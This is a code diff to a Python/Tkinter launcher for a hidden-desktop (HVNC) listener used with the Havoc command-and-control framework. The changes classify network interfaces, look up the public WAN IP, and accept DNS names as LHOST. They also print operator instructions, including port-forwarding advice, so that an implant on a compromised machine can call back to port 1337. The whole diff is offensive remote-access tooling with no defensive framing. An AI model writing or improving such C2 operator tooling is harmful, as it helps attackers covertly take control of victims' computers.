@@ -7,6 +7,8 @@ import re
 import socket
 import subprocess
 import sys
+import urllib.error
+import urllib.request
 
 PORT = 1337
 ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
@@ -21,6 +23,11 @@ BAD = "#fb4934"
 FIELD = "#2a221c"
 
 _IPV4 = re.compile(r"^(?:\d{1,3}\.){3}\d{1,3}$")
+_HOST = re.compile(
+    r"^(?=.{1,253}$)([A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)"
+    r"(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)+$"
+)
+_LABEL = re.compile(r"^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?$")
 
 def dbg(kind, msg):
     tag = {"ok": "[+]", "err": "[-]", "info": "[*]"}.get(kind, "[*]")
@@ -208,20 +215,45 @@ def find_terminal():
     return None, None
 
 
+def is_rfc1918(ip):
+    if not _IPV4.match(ip):
+        return False
+    a, b = (int(x) for x in ip.split(".")[:2])
+    if a == 10 or a == 127 or ip.startswith("192.168.") or ip.startswith("169.254."):
+        return True
+    if a == 172 and 16 <= b <= 31:
+        return True
+    return False
+
+
+def iface_kind(iface, ip):
+    name = iface.split("@", 1)[0]
+    if name.startswith(("docker", "br-", "veth", "virbr", "lxc", "cni", "podman")):
+        return "docker"
+    if name.startswith(("tun", "tap", "wg", "ppp", "tailscale", "zt", "utun")):
+        return "vpn"
+    if is_rfc1918(ip):
+        return "lan"
+    return "public"
+
+
 def lan_addrs():
+    """(iface, ip, kind) — kind is public|lan|vpn|docker."""
     out = []
     try:
         raw = subprocess.check_output(["ip", "-4", "-br", "a"], text=True)
         for line in raw.splitlines():
             parts = line.split()
-            if len(parts) < 3 or parts[0] == "lo":
+            if len(parts) < 3 or parts[0] == "lo" or parts[0].startswith("lo:"):
                 continue
             if parts[1] not in ("UP", "UNKNOWN"):
                 continue
-            ip = parts[2].split("/")[0]
-            if ip.startswith("127."):
-                continue
-            out.append((parts[0], ip))
+            iface = parts[0]
+            for cidr in parts[2:]:
+                ip = cidr.split("/")[0]
+                if not _IPV4.match(ip) or ip.startswith("127."):
+                    continue
+                out.append((iface, ip, iface_kind(iface, ip)))
     except (OSError, subprocess.CalledProcessError):
         pass
     if not out:
@@ -229,7 +261,7 @@ def lan_addrs():
             raw = subprocess.check_output(["hostname", "-I"], text=True)
             for ip in raw.split():
                 if _IPV4.match(ip) and not ip.startswith("127."):
-                    out.append(("host", ip))
+                    out.append(("host", ip, iface_kind("host", ip)))
         except (OSError, subprocess.CalledProcessError):
             pass
     if not out:
@@ -239,22 +271,54 @@ def lan_addrs():
             ip = s.getsockname()[0]
             s.close()
             if ip and not ip.startswith("127."):
-                out.append(("default", ip))
+                out.append(("default", ip, iface_kind("default", ip)))
         except OSError:
             pass
     def rank(item):
-        iface, ip = item
-        if iface.startswith("eth") and ip.startswith("192.168."):
-            return 0
-        if ip.startswith("192.168."):
-            return 1
-        if ip.startswith("10."):
-            return 2
-        if iface.startswith(("docker", "br-", "veth", "virbr", "lxc")):
-            return 9
-        return 5
+        iface, ip, kind = item
+        order = {"public": 0, "lan": 1, "vpn": 2, "docker": 9}
+        return (order.get(kind, 5), 0 if iface.startswith(("eth", "ens", "enp", "enx", "wlan")) else 1, iface)
     out.sort(key=rank)
     return out
+
+
+def fetch_wan_ip(timeout=2.5):
+    urls = (
+        "https://api.ipify.org",
+        "https://icanhazip.com",
+        "https://ifconfig.me/ip",
+    )
+    for url in urls:
+        try:
+            with urllib.request.urlopen(url, timeout=timeout) as resp:
+                ip = resp.read(64).decode("ascii", "ignore").strip()
+            if _IPV4.match(ip):
+                return ip
+        except (urllib.error.URLError, OSError, ValueError, TimeoutError):
+            continue
+    return None
+
+
+def resolve_a(host):
+    try:
+        infos = socket.getaddrinfo(host, PORT, socket.AF_INET, socket.SOCK_STREAM)
+    except (socket.gaierror, OSError):
+        return []
+    seen = []
+    for item in infos:
+        ip = item[4][0]
+        if ip not in seen:
+            seen.append(ip)
+    return seen
+
+
+def valid_lhost(text):
+    text = (text or "").strip()
+    if _IPV4.match(text):
+        return text
+    if _HOST.match(text) or _LABEL.match(text):
+        return text
+    return None
 
 
 def is_listening(port=PORT):
@@ -287,12 +351,35 @@ def havoc_line(ip, port=PORT):
     return "HiddenDesktop %s %d" % (ip, port)
 
 
+def describe_lhost(host):
+    lines = []
+    if _IPV4.match(host):
+        if is_rfc1918(host):
+            lines.append("[*] LHOST is RFC1918 — implant must reach this IP (LAN or VPN)")
+        else:
+            lines.append("[*] LHOST is a public IPv4 — open inbound TCP %d on this host" % PORT)
+        return lines
+    ips = resolve_a(host)
+    if ips:
+        lines.append("[+] DNS A  %s -> %s" % (host, ", ".join(ips)))
+        lines.append("[*] raw TCP %d (A record to this listener; HTTP CDN will not pass HVNC)" % PORT)
+    else:
+        lines.append("[-] DNS lookup failed for %s (implant gethostbyname needs an A record)" % host)
+    return lines
+
+
 def format_what_to_type(ip, port=PORT, listening=True):
+    extra = describe_lhost(ip)
     return "\n".join(
         [
             "======== HVNC ========",
             "[+] LHOST=%s  LPORT=%d" % (ip, port),
-            "[+] listener %s" % ("LISTEN 0.0.0.0:%d" % port if listening else "down"),
+            "[+] listener binds 0.0.0.0:%d  (%s)"
+            % (port, "LISTEN" if listening else "down"),
+            "[+] implant connects to LHOST (IP or DNS)",
+        ]
+        + extra
+        + [
             "[+] in Havoc (Admin, no rportfwd) type:",
             "",
             "    %s" % havoc_line(ip, port),
@@ -313,6 +400,7 @@ class Probe:
         self.term = None
         self.display = os.environ.get("DISPLAY") or ""
         self.wineprefix = os.environ.get("WINEPREFIX") or WINEPREFIX_DEFAULT
+        self.wan = None
         self.ok = False
         self.scan()
 
@@ -367,10 +455,27 @@ class Probe:
 
         addrs = lan_addrs()
         if addrs:
-            shown = ", ".join("%s=%s" % a for a in addrs[:6])
-            self._log("ok", "LHOST     %s" % shown)
+            for iface, ip, kind in addrs:
+                self._log("ok", "iface     %s  %s  (%s)" % (iface, ip, kind))
         else:
-            self._log("err", "no LAN IPv4 detected — type LHOST by hand")
+            self._log("err", "no IPv4 on any interface — type LHOST by hand")
+        wan = fetch_wan_ip()
+        if wan:
+            on_nic = any(ip == wan for _, ip, _ in addrs)
+            if on_nic:
+                self._log("ok", "WAN       %s  (on a local NIC — VPS/public)" % wan)
+            else:
+                self._log(
+                    "info",
+                    "WAN       %s  (NAT — implant needs this IP + port-forward TCP %d)"
+                    % (wan, PORT),
+                )
+            self.wan = wan
+        else:
+            self.wan = None
+            self._log("info", "WAN       unknown (no STUN / no internet from here)")
+        self._log("info", "LHOST is what the implant dials; listener always binds 0.0.0.0:%d" % PORT)
+        self._log("info", "DNS works (BOF gethostbyname) — type a hostname as LHOST")
 
         self._log("info", "WINEPREFIX %s" % self.wineprefix)
         self._log("info", "operator exe stays on this Linux host (not uploaded)")
@@ -455,7 +560,13 @@ def run_gui(probe):
     tk, ttk = _tk()
     if tk is None:
         sys.exit(1)
-    addrs = lan_addrs() or [("lan", "0.0.0.0")]
+    addrs = lan_addrs() or [("lan", "0.0.0.0", "lan")]
+    ip_choices = []
+    for _iface, ip, _kind in addrs:
+        if ip not in ip_choices:
+            ip_choices.append(ip)
+    if probe.wan and probe.wan not in ip_choices:
+        ip_choices.append(probe.wan)
 
     class App(tk.Tk):
         def __init__(self):
@@ -464,8 +575,9 @@ def run_gui(probe):
             self.configure(bg=BG)
             self.resizable(False, False)
             self.probe = probe
-            self.ip_var = tk.StringVar(value=addrs[0][1])
+            self.ip_var = tk.StringVar(value=ip_choices[0] if ip_choices else "")
             self.status_var = tk.StringVar(value="down")
+            self._choices = list(ip_choices)
             self._build()
             self.protocol("WM_DELETE_WINDOW", self.destroy)
             self.after(200, self._tick)
@@ -482,7 +594,7 @@ def run_gui(probe):
             ).pack(anchor="w", padx=16, pady=6)
             tk.Label(
                 wrap,
-                text="Wine 64-bit · port 1337 · exe stays on this host",
+                text="Wine 64-bit · bind 0.0.0.0:1337 · LHOST = implant dial target (IP or DNS)",
                 bg=BG,
                 fg=MUTED,
                 font=("DejaVu Sans", 9),
@@ -493,17 +605,30 @@ def run_gui(probe):
             tk.Label(grid, text="LHOST", bg=BG, fg=FG, font=("DejaVu Sans", 10, "bold")).grid(
                 row=0, column=0, sticky="w", pady=4
             )
-            ttk.Combobox(
+            self.ip_box = ttk.Combobox(
                 grid,
                 textvariable=self.ip_var,
-                values=[a[1] for a in addrs],
-                width=22,
+                values=self._choices,
+                width=28,
                 font=("DejaVu Sans Mono", 11),
-            ).grid(row=0, column=1, sticky="w", padx=(12, 8), pady=4)
-            hint = "   ".join("%s=%s" % a for a in addrs[:4]) or "type LAN IP"
-            tk.Label(grid, text=hint, bg=BG, fg=MUTED, font=("DejaVu Sans", 8)).grid(
-                row=1, column=1, sticky="w", padx=(12, 0)
             )
+            self.ip_box.grid(row=0, column=1, sticky="w", padx=(12, 8), pady=4)
+            self._btn(grid, "WAN", MUTED, self.on_wan).grid(
+                row=0, column=2, sticky="w", padx=(0, 0)
+            )
+            hint = "  ".join("%s=%s(%s)" % a for a in addrs[:8]) or "type IP or hostname"
+            if probe.wan:
+                hint += "  WAN=%s" % probe.wan
+            self.hint_var = tk.StringVar(value=hint)
+            tk.Label(
+                grid,
+                textvariable=self.hint_var,
+                bg=BG,
+                fg=MUTED,
+                font=("DejaVu Sans", 8),
+                wraplength=520,
+                justify="left",
+            ).grid(row=1, column=1, columnspan=2, sticky="w", padx=(12, 0))
             tk.Label(grid, text="LPORT", bg=BG, fg=FG, font=("DejaVu Sans", 10, "bold")).grid(
                 row=2, column=0, sticky="w", pady=4
             )
@@ -576,8 +701,30 @@ def run_gui(probe):
             self.log.configure(state="disabled")
 
         def _ip(self):
-            ip = self.ip_var.get().strip()
-            return ip if _IPV4.match(ip) else None
+            return valid_lhost(self.ip_var.get())
+
+        def on_wan(self):
+            dbg("info", "looking up public WAN IPv4")
+            wan = fetch_wan_ip()
+            if not wan:
+                dbg("err", "WAN lookup failed (no internet from this host?)")
+                return
+            self.probe.wan = wan
+            if wan not in self._choices:
+                self._choices.insert(0, wan)
+                self.ip_box.configure(values=self._choices)
+            self.ip_var.set(wan)
+            dbg("ok", "WAN %s — implant should dial this if TCP %d is reachable" % (wan, PORT))
+            on_nic = any(ip == wan for _i, ip, _k in lan_addrs())
+            if on_nic:
+                dbg("ok", "WAN matches a local NIC (VPS/public interface)")
+            else:
+                dbg(
+                    "info",
+                    "WAN is behind NAT — port-forward TCP %d to this host, or run the listener on the VPS"
+                    % PORT,
+                )
+            self._set_log(self.probe.dump() + "\n\n" + format_what_to_type(wan, listening=is_listening()))
 
         def _tick(self):
             up = is_listening()
@@ -587,7 +734,7 @@ def run_gui(probe):
         def on_start(self):
             ip = self._ip()
             if not ip:
-                dbg("err", "invalid LHOST (need IPv4 LAN address)")
+                dbg("err", "invalid LHOST (IPv4 or DNS name)")
                 return
             if not self.probe.ok:
                 dbg("err", "refusing START — missing HVNC or wine64")
